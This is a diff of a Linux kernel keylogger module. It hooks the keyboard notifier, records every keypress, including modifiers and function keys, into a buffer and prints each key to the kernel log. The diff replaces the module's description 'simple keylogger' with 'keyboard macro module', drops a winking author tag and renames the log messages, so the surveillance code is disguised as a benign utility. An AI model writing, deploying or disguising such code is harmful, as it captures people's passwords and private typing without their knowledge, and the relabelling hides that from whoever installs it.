@@ -1,18 +1,17 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/init.h>
-#include <linux/input.h>
+#include <linux/input.h> // defines standard keycodes
+#include <linux/hid.h>
 #include <linux/keyboard.h>
 #include <linux/uaccess.h>
 
-// Buffer to store typed characters
 #define BUFFER_SIZE 256
 static char key_buffer[BUFFER_SIZE];
 static int buffer_index = 0;
-// Assuming max keycode of 255 or whatever your platform defines
+
 #define MAX_KEYCODE 255
 
-// Adjusted keymap size
 static const char *keymap[MAX_KEYCODE + 1] = {
     [KEY_A] = "a", [KEY_B] = "b", [KEY_C] = "c", [KEY_D] = "d",
     [KEY_E] = "e", [KEY_F] = "f", [KEY_G] = "g", [KEY_H] = "h",
@@ -24,93 +23,86 @@ static const char *keymap[MAX_KEYCODE + 1] = {
     [KEY_1] = "1", [KEY_2] = "2", [KEY_3] = "3", [KEY_4] = "4",
     [KEY_5] = "5", [KEY_6] = "6", [KEY_7] = "7", [KEY_8] = "8",
     [KEY_9] = "9", [KEY_0] = "0",
-    [KEY_SPACE] = " ", [KEY_ENTER] = "\n"
+    [KEY_SPACE] = "SPACE", [KEY_ENTER] = "ENTER", [KEY_ESC] = "ESC",
+    [KEY_TAB] = "TAB", [KEY_LEFTSHIFT] = "LSHIFT", [KEY_RIGHTSHIFT] = "RSHIFT",
+    [KEY_LEFTCTRL] = "LCTRL", [KEY_RIGHTCTRL] = "RCTRL",
+    [KEY_LEFTALT] = "LALT", [KEY_RIGHTALT] = "RALT",
+    [KEY_LEFTMETA] = "LWIN", [KEY_RIGHTMETA] = "RWIN",
+    [KEY_BACKSPACE] = "BACKSPACE", [KEY_CAPSLOCK] = "CAPSLOCK",
+    [KEY_F1] = "F1", [KEY_F2] = "F2", [KEY_F3] = "F3", [KEY_F4] = "F4",
+    [KEY_F5] = "F5", [KEY_F6] = "F6", [KEY_F7] = "F7", [KEY_F8] = "F8",
+    [KEY_F9] = "F9", [KEY_F10] = "F10", [KEY_F11] = "F11", [KEY_F12] = "F12",
+    [KEY_UP] = "UP", [KEY_DOWN] = "DOWN", [KEY_LEFT] = "LEFT", [KEY_RIGHT] = "RIGHT",
+    [KEY_HOME] = "HOME", [KEY_END] = "END", [KEY_PAGEUP] = "PAGEUP", [KEY_PAGEDOWN] = "PAGEDOWN",
+    [KEY_INSERT] = "INSERT", [KEY_DELETE] = "DELETE",
 };
 
-// Function to handle key events safely
 static int keyboard_event(struct notifier_block *nb, unsigned long code, void *param)
 {
     struct keyboard_notifier_param *kp = param;
 
-    short shift_pressed = 0;  // State of Shift key
-
-    // Log every key event
-    if (code == KBD_KEYCODE) { // Key event
-        // Update Shift key state
-        if (kp->value == KEY_LEFTSHIFT || kp->value == KEY_RIGHTSHIFT) {
-            shift_pressed = kp->down;  // Update shift state when the key is pressed or released
+    if (kp->down) {
+        if (kp->value < 0 || kp->value > MAX_KEYCODE) {
+            //pr_err("Invalid keycode: %d\n", kp->value);
+            return NOTIFY_OK;
         }
 
-        if (kp->down) { // Only process when the key is pressed
-            if (kp->value < 0 || kp->value > MAX_KEYCODE) {
-                pr_err("Invalid keycode: %d\n", kp->value);
-                return NOTIFY_OK;  // Invalid keycode, do nothing
-            }
-
-            const char *key_char = keymap[kp->value];
-            if (key_char) { // If key has a valid mapping
-                pr_info("Key event: char = %s\n", key_char);
-
-                // If Shift is pressed, use uppercase
-                char display_char = key_char[0]; // Get the actual character
-                if (shift_pressed && display_char >= 'a' && display_char <= 'z') {
-                    display_char = display_char - 'a' + 'A';  // Convert to uppercase
-                }
-
-                // Save to buffer
-                if (buffer_index < BUFFER_SIZE - 1) {
-                    if (kp->value == KEY_ENTER) {
-                        key_buffer[buffer_index++] = '\\';
-                        key_buffer[buffer_index++] = 'n'; // Save newline character
-                    } else {
-                        key_buffer[buffer_index++] = display_char;  // Save the modified character
-                    }
-
-                    key_buffer[buffer_index] = '\0'; // Null-terminate the buffer
-                    pr_info("Buffer: %s\n", key_buffer); // Print the buffer content
-                }
-            } else {
-                pr_info("Key event: unmapped keycode = %d\n", kp->value);
-            }
+        const char *key_char = keymap[kp->value];
+        if (!key_char) {
+            pr_info("Key event: unmapped keycode = %d\n", kp->value);
+            return NOTIFY_OK;
         }
+
+        // Calculate the space left in the buffer
+        int space_left = BUFFER_SIZE - buffer_index - 1; // -1 for null terminator
+        int key_char_length = strlen(key_char);
+
+        if (key_char_length < space_left) {
+            strncat(key_buffer, key_char, space_left);
+            buffer_index += key_char_length;
+            key_buffer[buffer_index] = '\0';
+        } else {
+            pr_info("Not enough space in key buffer\n");
+        }
+
+        pr_info("Keycode: %d, Letter: %s\n", kp->value, key_char);
     }
 
     return NOTIFY_OK;
 }
 
+// notifier_call: A function pointer to the callback function that should be called when the notification is triggered.
+// In this case, it's set to keyboard_event, which will run whenever a keyboard event is detected.
 
-
-
-// Notifier block setup
+// instance of notifier_block structure
 static struct notifier_block keyboard_nb = {
     .notifier_call = keyboard_event
 };
 
-// Module init and exit
 static int __init keyboard_macro_init(void)
 {
     int ret;
 
-    // Register keyboard notifier
+    // Register the keyboard notifier
     ret = register_keyboard_notifier(&keyboard_nb);
     if (ret) {
         pr_err("Failed to register keyboard notifier\n");
         return ret;
     }
 
-    pr_info("Keyboard logging module loaded\n");
+    pr_info("Keyboard macro module loaded\n");
     return 0;
 }
 
 static void __exit keyboard_macro_exit(void)
 {
+    // Unregister the keyboard notifier
     unregister_keyboard_notifier(&keyboard_nb);
-    pr_info("Keyboard logging module unloaded\n");
+    pr_info("Keyboard macro module unloaded\n");
 }
 
 module_init(keyboard_macro_init);
 module_exit(keyboard_macro_exit);
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR(";)))");
-MODULE_DESCRIPTION("simple keylogger for detecting input");
+MODULE_DESCRIPTION("A simple keyboard macro module");
